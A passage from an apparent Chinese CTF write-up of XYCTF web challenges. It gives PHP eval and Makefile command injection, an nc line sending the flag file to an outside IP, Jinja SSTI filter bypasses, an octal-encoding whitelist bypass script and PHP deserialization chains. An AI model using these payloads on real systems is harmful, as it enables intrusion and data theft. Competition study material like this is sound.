但这里都被禁用了</p><p>所以我们要另辟蹊径来进行反弹shell </p><p>直接上payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=%0a`$_GET[1]`;%23&amp;1=nc 124.223.91.44 2333 &lt; &lt;(more /[b-z][b-z][^-b][b-z] )</span><br></pre></td></tr></table></figure><p>nc 反弹</p><p>禁用了flag就正则绕过</p><p>使用more命令其实是这周另一个题目给的灵感 后面会有写道</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`nc ip port &lt; &lt;(ls)`：这个命令中的 `&lt; &lt;` 符号表示将命令的输出作为输入传递给 `nc` 命令。`(ls)` 命令的输出会被传递给 `nc` 命令作为输入。这种写法是正确的，可以将 `(ls)` 命令的输出发送给 `nc` 命令，实现文件内容的传输。</span><br><span class="line"></span><br><span class="line">而这里的()是 在后台创建一个临时文件 然后将文件重定向给 nc 然后执行命令 进行反弹</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more命令是一个在Linux中常用的查看大文本文件内容的工具，它提供了分页显示和交互操作的功能，使用户能够更方便地浏览文件内容。</span><br><span class="line"></span><br><span class="line">除了more命令还可以：</span><br><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br></pre></td></tr></table></figure><p>看前面</p><p>eval(“#man,” . $cmd . “,mamba out”); 因为是拼接的 所以直接执行命令</p><p>%0a是换行 绕过前面的拼接 让eval可以执行后面命令</p><p>%23是# 将后面的拼接注释掉 但同时也注销了执行eval的; </p><p>所以要将;补上 </p><p>&#96;&#96;是执行命令的标志</p><p><img src="https://bu.dusays.com/2024/05/15/66441eeba478b.png" alt="image-20240406202106248"></p><h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$XYCTF</span> = <span class="string">&quot;Warm up&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$md5</span>) &amp;&amp; <span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ezez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$XY</span> == <span class="variable">$XYCTF</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$XY</span> != <span class="string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$XY</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;XYCTF_550102591&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;学这么久,传参不会传?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5的简单题 直接开绕</p><p>第一个绕过直接0e就行</p><p>第二个绕过也是弱比较 <code>$a==md5($a)</code><br>0e215962017 的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等</p><p>第三个绕过：</p><p>extract($_GET); 接收get传参的所有值 </p><p>由此 我们可以对$XYCTF 进行重定义</p><p>而XYCTF_550102591进行md5加密后其实是0e开头的md5值 </p><p>所有我们直接传0e的就行了</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">val1=s878926199a&amp;val2=s155964671a&amp;md5=0e215962017&amp;XY=s878926199a&amp;XYCTF=s878926199a</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441eed078b6.png" alt="image-20240406210529143"></p><p>进入第二关</p><p>一样有源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;操作你O.o&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);  <span class="comment">// 我可不会像别人一样设置10来个level</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;有点汗流浃背&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">有点汗流浃背</span><br></pre></td></tr></table></figure><p>第一个绕过：</p><p>直接传数组就行</p><p>第二个绕过：</p><p>我只能说很巧 做题的前一天开周会才讲了 第二天就用到了</p><p>是preg_replace&#x2F;e模式</p><p><code> preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit ] )</code></p><p>三个参数</p><p>会搜索 pattern 模式的匹配项并替换为 replacement </p><p>&#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p><p>当替换成功（在replacement中要有）就会执行php代码</p><p>所有payload如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=/l/e&amp;b=system(&#x27;cat /flag&#x27;);&amp;c=l</span><br><span class="line"></span><br><span class="line">a[]=1</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441eebe0651.png" alt="image-20240406211925917"></p><h2 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a>ezMake</h2><p><img src="https://bu.dusays.com/2024/05/15/66441eeb4325a.png" alt="image-20240406212035752"></p><p>先随便传一个数看看</p><p><img src="https://bu.dusays.com/2024/05/15/66441eeb5b485.png" alt="image-20240406212224815"></p><p>直接问AI</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-rwxr--r--    1 root     root            44 Apr  1 10:31 /flag</span><br></pre></td></tr></table></figure><p>其中有这个命令</p><p><img src="https://bu.dusays.com/2024/05/15/66441eeb975a9.png" alt="image-20240406212525293"></p><p>明显是被禁用了  禁用了&#x2F;</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(shell cat flag)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441eed25219.png" alt="image-20240406213327956"></p><p>这是用makefile执行shell的命令</p><h2 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a>ez?Make</h2><p><img src="https://bu.dusays.com/2024/05/15/66441eebaf859.png" alt="image-20240406213448264"></p><p>一样的 但是过滤了更多东西</p><p>直接payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd .. &amp;&amp; cd .. &amp;&amp; cd .. &amp;&amp; more [e-h][k-m][^-b][e-h]</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441eeb79e6a.png" alt="image-20240406213658206"></p><p>cd到根目录 执行more命令 因为禁用了f l a g 所有正则匹配就行</p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>签到题</p><p>根极客的差不多</p><p><img src="https://bu.dusays.com/2024/05/15/66441eeb9587d.png" alt="image-20240406213928342"></p><p>f12有hint</p><p><img src="https://bu.dusays.com/2024/05/15/66441eeb73d84.png" alt="image-20240406214002875"></p><p>所有直接robots.txt</p><p><img src="https://bu.dusays.com/2024/05/15/66441eebaff36.png" alt="image-20240406214120255"></p><p>访问</p><p><img src="https://bu.dusays.com/2024/05/15/66441eeb7191b.png" alt="image-20240406214139994"></p><p>登录</p><p><img src="https://bu.dusays.com/2024/05/15/66441eecce498.png" alt="image-20240406214209129"></p><p>这种题还是用bp好用</p><p>直接改referer</p><p><img src="https://bu.dusays.com/2024/05/15/66441eec97526.png" alt="image-20240406214857269"></p><p>改UA</p><p><img src="https://bu.dusays.com/2024/05/15/66441eecb89ac.png" alt="image-20240406215008293"></p><p>改本地</p><p>Client-IP:127.0.0.1</p><p><img src="https://bu.dusays.com/2024/05/15/66441eed037ad.png" alt="image-20240406215123274"></p><p>改via</p><p><img src="https://bu.dusays.com/2024/05/15/66441eed05e06.png" alt="image-20240406215330143"></p><p>改cookie</p><p><img src="https://bu.dusays.com/2024/05/15/66441eed660fb.png" alt="image-20240406215403465"></p><h2 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h2><p><img src="https://bu.dusays.com/2024/05/15/66441eebd83a2.png" alt="image-20240406215456430"></p><p>比较两个图片的md5 </p><p>直接网上随便一搜就有</p><p><img src="https://bu.dusays.com/2024/05/15/66441eeed2d41.jpg" alt="plane  md5同1"></p><p><img src="https://bu.dusays.com/2024/05/15/66441ef02a25c.jpg" alt="ship   md5同2"></p><p>就这两张就行 </p><p><img src="https://bu.dusays.com/2024/05/15/66441eec67e3d.png" alt="image-20240406215706709"></p><h2 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h2><p><img src="https://bu.dusays.com/2024/05/15/66441ef60eaff.png" alt="image-20240406215811408"></p><p>有Hint</p><p><img src="https://bu.dusays.com/2024/05/15/66441eebd740e.png" alt="image-20240406215828295"></p><p>弱密码爆破</p><p><img src="https://bu.dusays.com/2024/05/15/66441eed6f7c7.png" alt="image-20240406220204999"></p><p>进入</p><p><img src="https://bu.dusays.com/2024/05/15/66441ef3f21f3.png" alt="image-20240406220257575"></p><p>先随便传一个</p><p><img src="https://bu.dusays.com/2024/05/15/66441ef371ec7.png" alt="image-20240406220319830"></p><p>有url传参 但不是sql注入 结合题目 大概率ssti</p><p>传7*7</p><p><img src="https://bu.dusays.com/2024/05/15/66441ef5e4fed.png" alt="image-20240406220440756"></p><p>确定ssti</p><p>但直接传穿不进去</p><p>传数字字母都是回显本身</p><p>那如果传汉字 符号呢</p><p><img src="https://bu.dusays.com/2024/05/15/66441ef4aa0ad.png" alt="image-20240406220636710"></p><p><img src="https://bu.dusays.com/2024/05/15/66441ef11f9bd.png" alt="image-20240406220653934"></p><p>都是有特殊回显 并且在后面跟了一个{}</p><p>那传两个呢</p><p><img src="https://bu.dusays.com/2024/05/15/66441ef73fa7e.png" alt="image-20240406220826963"></p><p>两个<code>&#123;&#123;`    `&#125;&#125;</code></p><p>再试下7*7呢hexo</p><p><img src="https://bu.dusays.com/2024/05/15/66441ef74d418.png" alt="image-20240406220917735"></p><p>执行</p><p>接下来就简单了</p><p>测试过滤 然后ssti</p><p>手测了一下，过滤了 <code>_ 、 &#39; 、 &quot; 、 flag 、 system </code>，还有其他的啥，最终payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你好(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure><p>简单绕过就行</p><p><img src="https://bu.dusays.com/2024/05/15/66441ef740acf.png" alt="image-20240406221648712"></p><p><code>解释一下上述代码：lipsum是flask的一个方法，可以用于得到**builtins**，而且lipsum.**globals**含有os模块：&#123;&#123;lipsum.**globals**['os'].popen('ls').read()&#125;&#125;，而request.values.x表示接受所有参数，包括get传参和post传参。这里就是先用lipsum得到builtins，然后从中获取了 os 模块，并使用os.popen() 执行了一个命令</code></p><p>he</p><p>绕过__ 利用values传参即可, 直接用attr绕过点，利用getitem绕过[], 然后就按照模版注入就行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">傻鸟</span><br><span class="line">()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)</span><br><span class="line">()|attr(request.values.x4)</span><br><span class="line">(221)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4</span><br><span class="line">)(request.values.x7)|attr(request.values.x4)(request.values.x8)</span><br><span class="line">(request.values.x9)&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem_</span><br><span class="line">_&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&#x27;os&#x27;).pop</span><br><span class="line">en(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><p>第一周就是到这里</p><p>第二周</p><p>web re pwn都ak了 但是我们队在抢一个签到题时附件弄错了 然后被ban了 QAQ</p><h2 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">really ez?</span><br></pre></td></tr></table></figure><p>简单看一下 payload中只能有数字 <code>\\ \ </code>   <code>$ &lt;</code></p><p>直接脚本秒了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">n = <span class="built_in">dict</span>()</span><br><span class="line">n[<span class="number">0</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">n[<span class="number">1</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">n[<span class="number">2</span>] = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">n[<span class="number">3</span>] = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">n[<span class="number">4</span>] = <span class="string">&#x27;4&#x27;</span></span><br><span class="line">n[<span class="number">5</span>] = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">n[<span class="number">6</span>] = <span class="string">&#x27;6&#x27;</span></span><br><span class="line">n[<span class="number">7</span>] = <span class="string">&#x27;7&#x27;</span></span><br><span class="line">n[<span class="number">8</span>] = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">n[<span class="number">9</span>] = <span class="string">&#x27;9&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_oct</span>(<span class="params">cmd</span>):                                <span class="comment">#命令转换成八进制字符串</span></span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> cmd:</span><br><span class="line">        o = (<span class="string">&#x27;%s&#x27;</span> % (<span class="built_in">oct</span>(<span class="built_in">ord</span>(t))))[<span class="number">2</span>:]  <span class="comment">#ord转为ascll，然后oct转为8进制，然后从第三位开始截取</span></span><br><span class="line">        s+=<span class="string">&#x27;\\&#x27;</span>+o                       <span class="comment">#数字加上/  为8进制形式</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">cmd</span>):                                     <span class="comment">#八进制字符串转换成字符</span></span><br><span class="line">    payload = <span class="string">&quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\&#x27;&quot;</span>                 <span class="comment">#开头固定格式，然后就\\来区分数字</span></span><br><span class="line">    s = str_to_oct(cmd).split(<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        payload+=<span class="string">&quot;\\\\&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> _:</span><br><span class="line">            payload+=n[<span class="built_in">int</span>(i)]</span><br><span class="line">    <span class="keyword">return</span> payload+<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#弹shell</span></span><br><span class="line"><span class="built_in">print</span>(build(<span class="string">&#x27;cat /flag&#x27;</span>))</span><br><span class="line"><span class="comment">#根据题目改下结果 url编码</span></span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://bu.dusays.com/2024/05/15/66441eedefc10.png" alt="image-20240410201518574"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\143\\141\\164\\40\\57\\146\\154\\141\\147\&#x27;</span><br></pre></td></tr></table></figure><p>但是明显这并不能进行RCE</p><p>所以要进行url编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$0%3C%3C%3C$0%5C%3C%5C%3C%5C%3C%5C$%5C&#x27;%5C%5C143%5C%5C141%5C%5C164%5C%5C40%5C%5C57%5C%5C146%5C%5C154%5C%5C141%5C%5C147%5C&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441eee8e0ce.png" alt="image-20240410201714338"></p><h2 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pop</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pop</span>-&gt;<span class="title function_ invoke__">login</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>简单绕过 引用绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">&#125; </span><br><span class="line">  <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line">  <span class="variable">$a</span>-&gt;password = &amp;<span class="variable">$a</span>-&gt;token;</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;Flag&quot;:2:&#123;s:5:&quot;token&quot;;N;s:8:&quot;password&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441eefdfdea.png" alt="image-20240410202112605"></p><p>下一层：</p><p>fpclosefpclosefpcloseffflllaaaggg.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack-&gt;<span class="title function_ invoke__">nonExistentMethod</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;luo;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$wang1</span>,<span class="variable">$wang2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;O.o&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;lao-&gt;chen) ? <span class="string">&quot;&quot;</span> : <span class="variable language_">$this</span>-&gt;lao-&gt;chen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;num!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>也是 简单链子</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span 